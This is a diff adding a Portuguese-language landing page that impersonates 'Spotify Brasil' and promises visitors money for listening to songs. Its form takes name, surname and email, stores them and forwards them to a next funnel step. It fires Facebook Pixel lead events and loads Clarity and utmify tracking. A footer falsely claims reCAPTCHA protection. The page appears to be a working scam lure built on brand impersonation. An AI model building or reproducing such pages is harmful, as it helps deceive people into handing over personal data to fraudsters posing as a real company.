@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify</title>
+    
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "uem62uib5t");
+    </script>
+    
+    <!-- Facebook Pixel -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '949313014576281');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1949165059042573&ev=PageView&noscript=1"/></noscript>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            background-color: rgb(24, 24, 24);
+            justify-content: center;
+            align-items: center;
+        }
+        .centralizado {
+            width: 300px;
+            background-color: rgb(0, 0, 0);
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+        }
+        * {
+            font-family: "Poppins", sans-serif;
+            color: white;
+        }
+        #logocentral {
+            width: 90px;
+        }
+        #textoprincipalsptfy {
+            font-size: 23px;
+            font-weight: 700;
+        }
+        #descricaoiniciospotify {
+            color: rgb(168, 168, 168);
+            margin-top: -10px;
+            font-size: 15px;
+        }
+        #descricaoiniciospotifyy {
+            color: rgb(168, 168, 168);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        #logincadastro {
+            display: flex;
+            font-size: 15px;
+            width: 100%;
+            flex-direction: column;
+            text-align: left;
+        }
+        #nomeInput, #sobrenomeInput, #emailInput {
+            padding: 13px 10px;
+            color: rgb(168, 168, 168);
+            border-radius: 10px;
+            margin-top: 9px;
+            border: 1px solid rgb(168, 168, 168);
+            background-color: rgb(24, 24, 24);
+        }
+        
+        #nomeInput:focus, #sobrenomeInput:focus, #emailInput:focus {
+            outline: none;
+            border-color: rgb(1, 214, 97);
+        }
+        #botaoprocximetapa {
+            padding: 13px 10px;
+            background-color: rgb(1, 214, 97);
+            color: white;
+            margin-top: 20px;
+            border-radius: 50px;
+            border: 1px solid rgb(1, 214, 97);
+            text-decoration: none;
+            width: 90%;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="centralizado">
+        <!-- LOGO -->
+        <img src="images/logowhite.png" id="logocentral">
+
+        <!-- TEXTO -->
+        <p id="textoprincipalsptfy">
+            Seja bem-vindo ao<br>Spotify Brasil
+        </p>
+
+        <!-- DESCRIÇÃO -->
+        <p id="descricaoiniciospotify">
+            Faça seu <b>cadastro</b> e ganhe <br>dinheiro ouvindo músicas de <br>grandes artistas e ajude a moldar o futuro da música no Brasil!
+        </p>
+
+        <!-- FORMULÁRIO -->
+        <div id="logincadastro">
+            <input type="text" placeholder="Nome" id="nomeInput">
+            <input type="text" placeholder="Sobrenome" id="sobrenomeInput">
+            <input type="email" placeholder="Seu melhor e-mail aqui" id="emailInput">
+        </div>
+
+        <!-- BOTÃO -->
+        <button onclick="redirecionar()" id="botaoprocximetapa">Cadastrar e ganhar</button>
+
+        <!-- SCRIPT DE REDIRECIONAMENTO COM UTMS -->
+        <script>
+            function redirecionar() {
+                const nome = document.getElementById('nomeInput').value.trim();
+                const sobrenome = document.getElementById('sobrenomeInput').value.trim();
+                const email = document.getElementById('emailInput').value.trim();
+                
+                // Validar campos
+                if (!nome) {
+                    alert('Por favor, digite seu nome');
+                    return;
+                }
+                if (!sobrenome) {
+                    alert('Por favor, digite seu sobrenome');
+                    return;
+                }
+                if (!email) {
+                    alert('Por favor, digite seu e-mail');
+                    return;
+                }
+                
+                // Validar email
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    alert('Por favor, digite um e-mail válido');
+                    return;
+                }
+                
+                // Nome completo
+                const nomeCompleto = `${nome} ${sobrenome}`;
+                
+                // Salvar no localStorage
+                localStorage.setItem('usuario_nome', nomeCompleto);
+                localStorage.setItem('usuario_email', email);
+                localStorage.setItem('usuario_nome_input', nome);
+                localStorage.setItem('usuario_sobrenome', sobrenome);
+                
+                // Monta as UTMs capturadas
+                const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'xcod', 'sck', 'src']
+                    .map(param => {
+                        const value = localStorage.getItem(param);
+                        return value ? `${param}=${encodeURIComponent(value)}` : '';
+                    })
+                    .filter(Boolean)
+                    .join('&');
+
+                // Monta a URL final com nome e email
+                const urlDestino = `02/?nome=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}${utmParams ? '&' + utmParams : ''}`;
+
+                // Facebook Pixel - Lead Event
+                fbq('track', 'Lead');
+                
+                // Redireciona
+                window.location.href = urlDestino;
+            }
+        </script>
+
+        <p id="descricaoiniciospotifyy">
+            Este site é protegido pelo reCAPTCHA e está sujeito à <b style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b> e aos <b style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+        </p>
+    </div>
+
+    <!-- SCRIPT DO UTMFY COM PROTEÇÃO PARA SPOTIFY -->
+    <script>
+      if (!document.querySelector('iframe[src*="open.spotify.com"]')) {
+        var s = document.createElement('script');
+        s.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
+        s.async = true;
+        s.defer = true;
+        s.setAttribute('data-utmify-prevent-xcod-sck', '');
+        s.setAttribute('data-utmify-prevent-subids', '');
+        s.setAttribute('data-utmify-prevent-iframes', '');
+        document.body.appendChild(s);
+      }
+    </script>
+
+</body>
+</html>
